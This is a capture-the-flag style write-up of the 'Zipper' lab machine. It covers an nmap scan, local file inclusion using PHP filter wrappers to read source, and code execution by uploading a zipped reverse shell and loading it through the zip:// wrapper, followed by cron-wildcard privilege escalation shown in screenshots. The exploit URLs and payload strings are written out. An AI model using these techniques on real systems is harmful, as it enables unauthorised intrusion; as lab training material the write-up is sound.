---
icon: ubuntu
---

# Zipper - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.231.229 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-06 19:10 EDT
Nmap scan report for workaholic.offsec (192.168.231.229)
Host is up (0.032s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Zipper
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I'll add zipper.offsec to my /etc/hosts file

```
192.168.128.229	zipper.offsec
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (451).png" alt=""><figcaption></figcaption></figure>

When I press the home button a GET parameter shows up

<figure><img src="../../.gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">LFI</mark>

We can extract the source using the PHP base64 wrapper. It seems like it’s appending .php to the file

```
php://filter/convert.base64-encode/resource=index
```

<figure><img src="../../.gitbook/assets/image (453).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>

```
php://filter/convert.base64-encode/resource=home
```

<figure><img src="../../.gitbook/assets/image (455).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (456).png" alt=""><figcaption></figcaption></figure>

```
php://filter/convert.base64-encode/resource=upload
```

<figure><img src="../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>

We know that our zip files is stored at the `/uploads`. There’s this `zip://` PHP wrapper that will unzip and read our file automatically. Basically we just need to upload a reverse shell file and load it using the LFI and zip wrapper.

Detailed explanation at this [**link**](https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/)

To access it, just add %23 (#) and the name of the file inside the zip without .php, since the web will append .php to our file. Like this

```
http://192.168.231.229/index.php?file=zip://uploads/upload_1756523724.zip%23reverse
```

Will use pentest monkey reverse shell and save it into a zip file

<figure><img src="../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

Upload reverse.php

<figure><img src="../../.gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

Visit this page

```
http://192.168.231.229/index.php?file=zip://uploads/upload_1759792944.zip%23reverse
```

<figure><img src="../../.gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (2511).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">PSPY</mark>

<figure><img src="../../.gitbook/assets/image (2512).png" alt=""><figcaption></figcaption></figure>

Confirms we have a cron job running in the background

<figure><img src="../../.gitbook/assets/image (2513).png" alt=""><figcaption></figcaption></figure>

This looks like a wildcard exploit

<figure><img src="../../.gitbook/assets/image (2515).png" alt=""><figcaption></figcaption></figure>

Wait what is this a symbolic link pointing to a secret in root's directory!?

<figure><img src="../../.gitbook/assets/image (2514).png" alt=""><figcaption></figcaption></figure>

Is that root's password?

<figure><img src="../../.gitbook/assets/image (2516).png" alt=""><figcaption></figcaption></figure>

Did root just exploited himself :rofl:&#x20;
